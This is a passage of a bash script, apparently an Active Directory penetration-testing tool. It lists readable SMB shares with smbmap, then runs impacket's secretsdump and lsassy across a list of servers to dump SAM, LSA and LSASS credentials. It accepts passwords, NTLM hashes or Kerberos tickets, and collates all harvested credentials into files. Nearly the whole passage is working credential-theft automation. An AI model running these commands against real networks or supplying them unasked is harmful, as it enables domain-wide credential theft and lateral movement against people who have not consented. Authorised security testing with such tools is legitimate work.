            grep -iaH READ ${full_output_dir}/SMBShares/smb_shares_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${full_output_dir}/SMBShares/all_smb_shares_${domain}.csv
            grep -iaH READ ${full_output_dir}/SMBShares/smb_shares_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${full_output_dir}/SMBShares/all_smb_shares_${domain}.txt

            echo -e "${BLUE}[### END ###] 2: Listing accessible shares${NC}"
            echo -e ""

            #--------------------------------------------STEP 3 ----------------------------------------------------
            echo -e "${BLUE}[### START ###] 3: Listing files in accessible shares${NC}"

            for i in $(cat ${full_output_dir}/smb_servers_list_${domain}.txt); do
            echo -e "${CYAN}[# Start #] Listing files in accessible shares of ${i} ${NC}"
            if [ "${anon_bool}" == true ] ; then
                ${smbmap} -H $i -u ${user} -p "" -d ${domain} -g -r --exclude 'ADMIN\$ C\$ C IPC\$ print\$ SYSVOL NETLOGON prnproc\$' | grep -v "Working on it..." > ${full_output_dir}/SMBShares/smb_shares_files_${i}.txt 2>&1
            elif [ "${hash_bool}" == true ] ; then
                ${smbmap} -H $i -u ${user} -p ${hash} -d ${domain} -g -r --exclude 'ADMIN\$ C\$ C IPC\$ print\$ SYSVOL NETLOGON prnproc\$' | grep -v "Working on it..." > ${full_output_dir}/SMBShares/smb_shares_files_${i}.txt 2>&1
            elif [ "${kerb_bool}" == true ] ; then
                echo -e "${YELLOW}[### SKIP ###] Skipping smbmap because using kerberos ticket as authentication${NC}"    
            else
                ${smbmap} -H $i -u ${user} -p ${password} -d ${domain} -g -r --exclude 'ADMIN\$ C\$ C IPC\$ print\$ SYSVOL NETLOGON prnproc\$' | grep -v "Working on it..." > ${full_output_dir}/SMBShares/smb_shares_files_${i}.txt 2>&1
            fi
            echo -e "${CYAN}[# End #] Listing files in accessible shares of ${i} ${NC}"
            done

            echo -e "${BLUE}[### END ###] 3: Listing files in accessible shares${NC}"
            echo -e ""
fi
}

remote_pwd_dump () { 
        full_output_dir="${output_dir}/${domain}"
        mkdir -p ${full_output_dir}/Credentials
        
        if [ ! -f "${servers_ip_list}" ] ; then
            echo -e "${YELLOW}[### INFO ###] IP addresses list not specified, using nslookup.. ${NC}"
            echo -e ""
            if [ "${nslookup_ran}" == false ] ; then
                run_nslookup
            else
                servers_ip_list="${full_output_dir}/ip_list_${domain}.txt"
            fi
        fi
        if [ ! -f "${servers_ip_list}" ] ; then
            echo -e "${RED}[### FAIL ###] Error accessing servers file.. ${NC}"
            echo -e ""
            return 1
        fi
        
        ## Dump credentials from SAM, SYSTEM and LSA secrets
        if [ ! -f "${impacket_dir}/secretsdump.py" ] ;  then
            echo -e "${YELLOW}[### SKIP ###] Please verify the installation of impacket${NC}"
            echo -e ""
        else
            echo -e "${BLUE}[### START ###] Dump creds using secretsdump ${NC}"
            for i in $(cat ${servers_ip_list}); do
                echo -e "${CYAN}[# Start #] secretsdump of ${i} ${NC}"
                if [ "${anon_bool}" == true ] ; then
                    echo -e "${YELLOW}[### SKIP ###] secretsdump requires credentials${NC}"
                    break
                elif [ "${hash_bool}" == true ] ; then
                    /usr/bin/python3 ${impacket_dir}/secretsdump.py ${domain}/${user}@${i} -hashes ${hash} > ${full_output_dir}/Credentials/secrets_dump_${i}.txt 2>&1
                elif [ "${kerb_bool}" == true ] ; then
                    /usr/bin/python3 ${impacket_dir}/secretsdump.py -k -no-pass ${domain}/${user}@${i} > ${full_output_dir}/Credentials/secrets_dump_${i}.txt 2>&1
                else
                    /usr/bin/python3 ${impacket_dir}/secretsdump.py ${domain}/${user}:${password}@${i} > ${full_output_dir}/Credentials/secrets_dump_${i}.txt 2>&1
                fi
                
                if grep -qi 'error' ${full_output_dir}/Credentials/secrets_dump_${i}.txt; then
                    echo -e "${RED}[# Fail #] Errors detected using secretsdump on ${i} ${NC}"
                fi
                echo -e "${CYAN}[# End #] secretsdump of ${i} ${NC}"
            done
            echo -e "${BLUE}[### END ###] Dump creds using secretsdump ${NC}"
            echo -e ""
        fi
        
        ## Dump credentials from LSASS
        if [ "${lsassy_bool}" == true ] ; then
            if [ ! -f "${lsassy}" ] ;  then
                echo -e "${YELLOW}[### SKIP ###] Please verify the installation of lsassy${NC}"
                echo -e ""
            else
                echo -e "${BLUE}[### START ###] Dump creds using lsassy ${NC}"
                for i in $(cat ${servers_ip_list}); do
                    echo -e "${CYAN}[# Start #] lsass dump of ${i} ${NC}"
                    if [ "${anon_bool}" == true ] ; then
                        echo -e "${YELLOW}[### SKIP ###] lsass dump requires credentials${NC}"
                        break
                    elif [ "${hash_bool}" == true ] ; then
                        ${lsassy} -d ${domain} -u ${user} -H ${hash} -f grep $i > ${full_output_dir}/Credentials/lsass_dump_${i}.txt 2>&1
                        #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M > ${full_output_dir}/Credentials/lsass_dump_${i}.txt 2>&1
                    elif [ "${kerb_bool}" == true ] ; then
                        ${lsassy} -d ${domain} -u ${user} -k -f grep $i 2>&1 > ${full_output_dir}/Credentials/lsass_dump_${i}.txt
                        #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -k -M lsassy > ${full_output_dir}/Credentials/lsass_dump_${i}.txt 2>&1
                    else
                        ${lsassy} -d ${domain} -u ${user} -p ${password} -f grep $i > ${full_output_dir}/Credentials/lsass_dump_${i}.txt 2>&1
                        #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M lsassy > ${full_output_dir}/Credentials/lsass_dump_${i}.txt 2>&1
                    fi
                    if grep -q '[X]' ${full_output_dir}/Credentials/lsass_dump_${i}.txt; then
                        echo -e "${RED}[# Fail #] Errors detected using lsassy on ${i} ${NC}"
                    else
                        /bin/cat ${full_output_dir}/Credentials/lsass_dump_${i}.txt 2>/dev/null | sed 's/\t/:/g; s/::/:/g; s/::/:/g' > ${full_output_dir}/Credentials/lsass_dump_parsed_${i}.txt
                    fi
                    echo -e "${CYAN}[# End #] lsass dump of ${i} ${NC}"
                done
                echo -e "${BLUE}[### END ###] Dump creds using lsassy ${NC}"
                echo -e ""
            fi
        fi

        echo -e "${YELLOW}[### INFO ###] Printing all credentials ...${NC}"

        if [ "$(/bin/ls ${full_output_dir}/Credentials/secrets_dump_* 2>/dev/null)" ] ; then
            grep . -aH ${full_output_dir}/Credentials/secrets_dump_* 2>&1 | cut -d ":" -f 1,2,3,4,5 | grep -av "\*\|aes\|des\|failed\|Impacket\|NL\$KM\|\\$:\|dpapi\|: " | sort -u | rev | cut -d "/" -f 1 | rev | sed "s/_/ /g;s/.txt:/\n/g;" | tee ${full_output_dir}/Credentials/all_secrets_dump_${domain}.txt 2>&1
        fi

        if [ "${lsassy_bool}" == true ] ; then
            if [ "$(/bin/ls ${full_output_dir}/Credentials/lsass_dump_* 2>/dev/null)" ] ; then
                grep . -aH ${full_output_dir}/Credentials/lsass_dump_* 2>&1 | cut -d ":" -f 1,2,3,4,5 | grep -va "[X]\|\\$:" | cut -d ':' -f 1,4,5 | sort -u | rev | cut -d "/" -f 1 | rev | sed "s/_/ /g;s/.txt:/\n/g;" | tee ${full_output_dir}/Credentials/all_lsass_dump_${domain}.txt 2>&1
            fi
        fi
}

main